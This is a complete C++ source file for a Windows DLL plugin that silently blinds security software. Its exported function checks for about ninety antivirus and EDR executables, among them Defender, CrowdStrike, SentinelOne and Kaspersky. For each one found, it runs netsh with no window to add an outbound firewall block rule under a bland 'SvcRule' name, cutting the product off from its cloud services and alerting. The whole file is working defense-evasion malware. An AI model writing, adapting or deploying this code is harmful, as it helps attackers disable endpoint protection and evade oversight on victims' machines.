#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static BOOL _Exec(wchar_t* cmd){
    STARTUPINFOW si={};PROCESS_INFORMATION pi={};si.cb=sizeof(si);
    BOOL r=CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(r){WaitForSingleObject(pi.hProcess,10000);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return r;
}

static void _AddRule(const wchar_t* sys, const wchar_t* envPath, int idx){
    wchar_t exe[MAX_PATH]={};
    ExpandEnvironmentStringsW(envPath,exe,MAX_PATH);
    if(GetFileAttributesW(exe)==INVALID_FILE_ATTRIBUTES)return;
    SYSTEMTIME st={};GetLocalTime(&st);
    wchar_t name[48]={};
    wsprintfW(name,L"SvcRule%04d%02d%02d%04d%d",st.wYear,st.wMonth,st.wDay,GetTickCount()%10000,idx);
    wchar_t cmd[2048]={};
    wsprintfW(cmd,L"%s\\netsh.exe advfirewall firewall add rule name=\"%s\" dir=out action=block program=\"%s\" enable=yes",sys,name,exe);
    _Exec(cmd);
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    wchar_t sys[MAX_PATH]={};
    GetSystemDirectoryW(sys,MAX_PATH);

    const wchar_t* targets[]={
        L"%ProgramFiles%\\Windows Defender\\MsMpEng.exe",
        L"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe",
        L"%ProgramFiles%\\Windows Defender\\NisSrv.exe",
        L"%ProgramFiles%\\Windows Defender\\MsMpLics.exe",
        L"%ProgramFiles%\\Windows Defender\\MpDefenderCoreService.exe",
        L"%ProgramFiles%\\Avast Software\\Avast\\AvastSvc.exe",
        L"%ProgramFiles%\\AVAST Software\\Avast\\AvastUI.exe",
        L"%ProgramFiles(x86)%\\Avast Software\\Avast\\AvastSvc.exe",
        L"%ProgramFiles%\\AVG\\Antivirus\\AVGSvc.exe",
        L"%ProgramFiles(x86)%\\AVG\\Antivirus\\AVGSvc.exe",
        L"%ProgramFiles%\\Bitdefender\\Bitdefender Security\\bdagent.exe",
        L"%ProgramFiles%\\Bitdefender\\Endpoint Security\\EPSecurityService.exe",
        L"%ProgramFiles%\\ESET\\ESET Security\\ekrn.exe",
        L"%ProgramFiles%\\ESET\\ESET Endpoint Security\\ekrn.exe",
        L"%ProgramFiles%\\Kaspersky Lab\\Kaspersky\\avp.exe",
        L"%ProgramFiles%\\Kaspersky Lab\\Kaspersky Endpoint Security for Windows\\avp.exe",
        L"%ProgramFiles%\\Malwarebytes\\Anti-Malware\\MBAMService.exe",
        L"%ProgramFiles%\\Sophos\\Sophos Anti-Virus\\SavService.exe",
        L"%ProgramFiles%\\McAfee\\MSC\\McShield.exe",
        L"%ProgramFiles%\\Norton\\Norton Security\\NortonSecurity.exe",
        L"%ProgramFiles%\\F-Secure\\fmon.exe",
        L"%ProgramFiles%\\SentinelOne\\Sentinel Agent\\SentinelAgent.exe",
        L"%ProgramFiles%\\SentinelOne\\Sentinel Agent\\SentinelServiceHost.exe",
        L"%ProgramFiles%\\SentinelOne\\Sentinel Agent\\SentinelStaticEngine.exe",
        L"%ProgramFiles%\\CrowdStrike\\CSFalconService\\CSFalconService.exe",
        L"%ProgramFiles%\\Panda Security\\Panda Dome\\PandaAVEngine.exe",
        L"%ProgramFiles%\\WatchGuard\\WGES\\PSANHost.exe",
        L"%ProgramFiles(x86)%\\Trend Micro\\OfficeScan Client\\TmListen.exe",
        L"%ProgramFiles%\\Trend Micro\\Apex One\\PCCSRV\\Ntrtscan.exe",
        L"%ProgramFiles%\\Trend Micro\\Client Server Security Agent\\TmListen.exe",
        L"%ProgramFiles%\\Symantec\\Symantec Endpoint Protection\\Smc.exe",
        L"%ProgramFiles(x86)%\\Symantec\\Symantec Endpoint Protection\\Smc.exe",
        L"%ProgramFiles%\\Broadcom\\Symantec Endpoint Protection\\Smc.exe",
        L"%ProgramFiles%\\VMware\\VMware Carbon Black\\RepMgr.exe",
        L"%ProgramFiles%\\Confer\\RepMgr64.exe",
        L"%ProgramFiles%\\Cylance\\Desktop\\CylanceSvc.exe",
        L"%ProgramFiles%\\Webroot\\WRSA.exe",
        L"%ProgramFiles(x86)%\\Webroot\\WRSA.exe",
        L"%ProgramFiles%\\COMODO\\COMODO Internet Security\\cmdagent.exe",
        L"%ProgramFiles%\\Emsisoft Anti-Malware\\a2service.exe",
        L"%ProgramFiles(x86)%\\G Data\\G DATA AntiVirus\\AVKWCtl.exe",
        L"%ProgramFiles%\\Trellix\\ENS\\Threat Prevention\\mfemactl.exe",
        L"%ProgramFiles%\\VIPRE\\SBAMSvc.exe",
        L"%ProgramFiles%\\Panda Security\\WaAgent\\WaAgent.exe",
        L"%ProgramFiles%\\McAfee\\Endpoint Security\\Threat Prevention\\mfemactl.exe",
        // Elastic Security Agent
        L"%ProgramFiles%\\Elastic\\Agent\\elastic-agent.exe",
        // Cortex XDR (Palo Alto Networks / Traps)
        L"%ProgramFiles%\\Palo Alto Networks\\Traps\\cyserver.exe",
        L"%ProgramFiles%\\Palo Alto Networks\\Traps\\cys.exe",
        // Microsoft Defender for Endpoint sensor (EDR — not AV)
        L"%ProgramFiles%\\Windows Defender Advanced Threat Protection\\MsSense.exe",
        // Cybereason
        L"%ProgramFiles%\\Cybereason ActiveProbe\\Cybereason.exe",
        L"%ProgramFiles%\\Cybereason ActiveProbe\\AmSvc.exe",
        // Check Point Harmony Endpoint
        L"%ProgramFiles%\\CheckPoint\\Endpoint Security\\EFR\\EFRService.exe",
        // FireEye / Mandiant Endpoint Security
        L"%ProgramFiles%\\FireEye\\FireEye Endpoint Agent\\xagt.exe",
        // Fortinet FortiClient / FortiEDR
        L"%ProgramFiles%\\Fortinet\\FortiClient\\FortiClient.exe",
        L"%ProgramFiles%\\Fortinet\\FortiEDR\\FortiEDRCollector.exe",
        // Cisco Secure Endpoint (formerly AMP for Endpoints)
        L"%ProgramFiles%\\Cisco\\AMP\\sfc.exe",
        // Rapid7 Insight Agent
        L"%ProgramFiles%\\Rapid7\\Insight Agent\\ir_agent.exe",
        // Huntress Agent
        L"%ProgramFiles%\\Huntress\\HuntressAgent.exe",
        // Tanium Client
        L"%ProgramFiles%\\Tanium\\Tanium Client\\TaniumClient.exe",
        // Wazuh Agent
        L"%ProgramFiles%\\ossec-agent\\ossec-agent.exe",
        L"%ProgramFiles%\\Wazuh Agent\\wazuh-agent.exe",
        // Qualys Cloud Agent
        L"%ProgramFiles%\\Qualys\\QualysAgent\\QualysAgent.exe",
        // Tenable Nessus Agent
        L"%ProgramFiles%\\Tenable\\Nessus Agent\\nessus-agent.exe",
        // Deep Instinct
        L"%ProgramFiles%\\Deep Instinct\\Deep Instinct Service\\deepinstinct.service.exe",
        // Cynet
        L"%ProgramFiles%\\Cynet\\CynetAgent\\CynetAgent.exe",
        // ThreatLocker
        L"%ProgramFiles%\\ThreatLocker\\ThreatLockerService.exe",
        // Heimdal Security
        L"%ProgramFiles%\\Heimdal Security\\Heimdal Agent\\Heimdal.Agent.exe",
        // Morphisec (memory protection / MTD)
        L"%ProgramFiles%\\Morphisec\\MorphisecService.exe",
        // Avira
        L"%ProgramFiles%\\Avira\\AntiVir Desktop\\avguard.exe",
        L"%ProgramFiles%\\Avira\\Antivirus\\avguard.exe",
        // Dr.Web
        L"%ProgramFiles%\\DrWeb\\dwservice.exe",
        L"%ProgramFiles%\\DrWeb\\SpIDer Guard.exe",
        // Qihoo 360 Total Security
        L"%ProgramFiles%\\360\\Total Security\\QHSafeSvc.exe",
        L"%ProgramFiles(x86)%\\360\\Total Security\\QHSafeSvc.exe",
        // AhnLab V3 Internet Security
        L"%ProgramFiles%\\AhnLab\\V3 Internet Security\\V3SP.exe",
        // K7 Computing Total Security
        L"%ProgramFiles%\\K7 Computing\\K7 Total Security\\K7TSecurity.exe",
        // Kingsoft Internet Security
        L"%ProgramFiles%\\Kingsoft Internet Security\\KIS.exe",
        L"%ProgramFiles(x86)%\\Kingsoft Internet Security\\kis.exe",
        // Tencent PC Manager (QQPCMgr)
        L"%ProgramFiles(x86)%\\Tencent\\QQPCMgr\\Main\\QQPCTray.exe",
        // Quick Heal Antivirus
        L"%ProgramFiles%\\Quick Heal\\Quick Heal Antivirus\\scanner.exe",
        // Rising Antivirus (瑞星)
        L"%ProgramFiles%\\Rising\\RSD\\RSD_PFW.exe",
        // eScan / MicroWorld
        L"%ProgramFiles%\\MicroWorld\\eScan\\MWAGENT.exe",
        // Seqrite Endpoint Security
        L"%ProgramFiles%\\Seqrite\\Endpoint Security\\SRTasks.exe",
        // Huorong Internet Security (火绒)
        L"%ProgramFiles%\\Huorong\\Sysdiag\\usysdiag.exe",
        // Jiangmin KV Antivirus
        L"%ProgramFiles%\\Jiangmin\\KV Antivirus\\KVMonXP.exe",
        // PC Matic
        L"%ProgramFiles%\\PC Matic\\PCMatic.exe",
        // VBA32 / VirusBlokAda
        L"%ProgramFiles%\\VBA32\\vba32loader.exe",
        // Total Defense Internet Security
        L"%ProgramFiles%\\Total Defense\\Total Defense Internet Security Suite\\TDCCore.exe",
        // Acronis Cyber Protect
        L"%ProgramFiles%\\Acronis\\Cyber Protect\\BackgroundAgent.exe",
        // Smadav
        L"%ProgramFiles%\\SmadAV\\SmadAV.exe",
        // Bkav Pro
        L"%ProgramFiles%\\Bkav Pro\\BkavService.exe",
        // Gridinsoft Anti-Malware
        L"%ProgramFiles%\\GridinSoft Anti-Malware\\gsam.exe",
        // TotalAV
        L"%ProgramFiles%\\TotalAV\\TotalAVSrv.exe",
        // Zemana AntiMalware
        L"%ProgramFiles%\\Zemana\\AntiMalware\\Zemana.AntiMalware.exe",
        // Sangfor EDR (Chinese enterprise)
        L"%ProgramFiles%\\Sangfor\\EDR\\SangforEDR.exe",
        // ManageEngine Desktop Central Agent
        L"%ProgramFiles%\\ManageEngine\\DesktopCentral_Agent\\bin\\dcagentservice.exe",
        // Forcepoint One Endpoint
        L"%ProgramFiles%\\Forcepoint\\Endpoint\\fp_agent.exe",
    };
    DWORD n=sizeof(targets)/sizeof(targets[0]);
    for(DWORD i=0;i<n;i++)_AddRule(sys,targets[i],(int)i);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
